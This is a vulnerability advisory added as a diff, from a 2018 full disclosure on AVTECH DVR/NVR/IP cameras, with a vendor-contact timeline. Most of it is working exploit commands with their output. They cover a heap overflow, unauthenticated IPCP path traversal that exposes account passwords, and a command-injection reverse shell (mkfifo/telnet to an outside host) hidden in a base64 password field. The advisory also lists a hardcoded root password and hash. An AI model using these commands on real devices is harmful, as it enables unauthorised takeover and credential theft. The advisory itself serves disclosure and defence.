@@ -1,0 +1,158 @@
+[STX]
+
+Subject: AVTECH {DVR/NVR/IPC} Heap Overflow, IPCP API, RCE
+
+Attack vector: Remote
+Authentication: Anonymous (no credentials needed)
+Researcher: bashis <mcw noemail eu> (March 2018)
+PoC: https://github.com/mcw0/PoC
+Release date: June 18, 2018
+Full Disclosure: 90 days
+
+-[Timeline]-
+March 13: 2018: Trying to contact SEARCH-LAB, after reading https://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities
+March 14, 2018: Contact established with SEARCH-LAB who offered to assist with contacting Avtech
+March 21, 2018: Avtech established contact
+March 21, 2018: Provided Avtech all details including Python PoC
+March 22, 2018: Avtech thanked for notification and provided information
+March 27, 2018: Avtech provided updated Firmware
+June 3, 2018: Asked if Avtech is ready for Full Disclosure on June 18, 2018.
+June 3, 2018: Avtech said their updated Firmware resolve below vulnerabilities
+June 18, 2018: Full Disclosure
+
+Vendor: http://www.avtech.com.tw/
+
+Credit: Thanks to SEARCH-LAB (https://www.search-lab.hu/) for their support to contact Avtech
+
+-[Summary]-
+1. Heap Overflow
+2. Undocumented and unauthenticated write only API
+3. URL decode error
+4. Authenticated Reverse Shell
+5. Hardcoded root credentials
+
+1)
+-[Heap Overflow]-
+
+$ curl -v "http://192.168.57.20:80/cgi-bin/nobody/`for((i=0;i<1248;i++));do echo -en "A";done`"
+
+$ strace -ff -p $(pidof streamd)
+[...]
+[pid 17773] write(2, "uri too long!\n", 14) = 14
+[pid 17773] writev(2, [{iov_base="*** glibc detected *** ", iov_len=23}, {iov_base="streamd", iov_len=7}, {iov_base=": ", iov_len=2}, {iov_base="double free or corruption (out)", iov_len=31}, {iov_base=": 0x", iov_len=4}, {iov_base="00534238", iov_len=8}, {iov_base=" ***\n", iov_len=5}], 7) = 80
+[...]
+[pid 17773] +++ killed by SIGABRT +++
++++ killed by SIGABRT +++
+
+2)
+-[Undocumented and unauthenticated write only API]-
+
+Note:
+Long time vulnerability, at least from 2010.
+Seems to be fixed for some devices and firmware from Q2 2017, but far from all.
+(The mitigation is simply a hardcoded check if incoming packet coming from '127.0.0.1', if not - report and discard the packet)
+
+There is lots of them available (>70 depending of device) that can be called by changing 'Message-ID' number accordingly
+
+Every incoming packet will be checked in the header to see if they match following.
+
+MATCH | Set R2   | Example           | Comment
+------|----------|-------------------|
+HTTP/ | R2 = 0x2 | (GET / HTTP/1.1)  | N/A
+RTSP/ | R2 = 0x1 | (GET / RTSP/1.0)  | N/A
+IPCP/ | R2 = 0x4 | (GET / IPCP/1.0)  | Undocumented and unauthenticated write only API
+<?xml | R2 = 0x5 | (GET / <?xml)     | Eh?
+
+-[IPCP]-
+
+[Change HTTP port from TCP/80 to TCP/8080]
+$ echo -en "GET / IPCP/1.0\r\nMessage-ID: 7\r\nConnection: close\r\nContent-Length: 4\r\n\r\n\x90\x1f\x00\x00"|ncat -v 192.168.57.20 80
+
+[Change default page]
+
+{Before}
+$ curl -v http://192.168.57.20:8080
+[...]
+< HTTP/1.1 200 OK
+< Date: Wed, 14 Mar 2018 16:12:42 GMT
+[...]
+< Content-Length: 17649
+<
+<html>
+<head>
+[...]
+
+{Redirect}
+$ echo -en "GET / IPCP/1.0\r\nMessage-ID: 29\r\nConnection: close\r\nContent-Length: 39\r\n\r\n../../../../../mnt/database/xml/Account"|ncat -v 192.168.57.20 8080
+
+{After}
+$ curl -v http://192.168.57.20:8080
+[...]
+< HTTP/1.1 200 OK
+< Date: Wed, 14 Mar 2018 16:12:42 GMT
+[...]
+< Content-Length: 7665
+<
+<Account>
+   <Maxuser Level="40/40">20</Maxuser>
+   <MaxuserRange Level="40/40">20</MaxuserRange>
+   <LocalPassword Level="40/40">0000</LocalPassword>
+   <OperatorPassword Level="40/40">0000</OperatorPassword>
+   <AnonymousLogin Level="40/40" Dispatch="account">DISABLE</AnonymousLogin>
+   <AdvenceUserLevel Level="40/40">OFF</AdvenceUserLevel>
+   <AccountSecure Level="40/40">0</AccountSecure>
+   <User1>
+      <Username Level="40/40">admin</Username>
+      <Password Level="40/40">admin</Password>
+      <Level Level="40/40">SUPERVISOR</Level>
+      <Lifetime Level="40/40">INFINITE</Lifetime>
+      <PhoneNum1 Level="40/40"/>
+      <PhoneNum2 Level="40/40"/>
+      <PhoneNum3 Level="40/40"/>
+      <IDCode Level=""/>
+   </User1>
+
+
+3)
+-[URL decode error]-
+
+$ curl -v 'http://192.168.57.20:8080/cgi-bin/%"E%"E%"E/nobody/Machine.cgi'
+[...]
+<HTML><HEAD><TITLE>403 Forbidden</TITLE></HEAD>
+<BODY><H1>403 Forbidden</H1>
+Your client does not have permission to get URL /cgi-bin/.../nobody/Machine.cgi from this server.
+</BODY></HTML>
+[...]
+$
+
+4)
+-[Authenticated RCE (Reverse Shell)]-
+
+Well, it's authenticated, but with the combination of pulling credentials above - it can be considered as 'Anonymous' RCE.
+
+[Base64 encoded RCE]
+// Prepare 'new_password'
+$ echo -en '"$(mkfifo /tmp/s;telnet 192.168.57.1 4444 </tmp/s|/bin/sh>/tmp/s ;rm -f /tmp/s)&#"'|base64
+
+$ curl -v "http://192.168.57.20:80/cgi-bin/nobody/Machine.cgi?action=change_password&account=$(echo -en admin:admin|base64)&new_password=IiQobWtmaWZvIC90bXAvczt0ZWxuZXQgMTkyLjE2OC41Ny4xIDQ0NDQgPC90bXAvc3wvYmluL3NoPi90bXAvcyA7cm0gLWYgL3RtcC9zKSYjIg=="
+[...]
+0
+OK
+
+[Reset back password to 'admin']
+// Prepare 'account'
+$ echo -en 'admin:"$(mkfifo /tmp/s;telnet 192.168.57.1 4444 </tmp/s|/bin/sh>/tmp/s ;rm -f /tmp/s)&#"'|base64
+
+$ curl -v "http://192.168.57.20:80/cgi-bin/nobody/Machine.cgi?action=change_password&account=YWRtaW46IiQobWtmaWZvIC90bXAvczt0ZWxuZXQgMTkyLjE2OC41Ny4xIDQ0NDQgPC90bXAvc3wvYmluL3NoPi90bXAvcyA7cm0gLWYgL3RtcC9zKSYjIg==&new_password=$(echo -en admin|base64)"
+[...]
+0
+OK
+
+5)
+-[Hardcoded root credentials]-
+
+avtech97         (root) (root:bn2OuGcYYgGaA:0:0:root:/root:/bin/sh)
+
+
+[ETX]
+
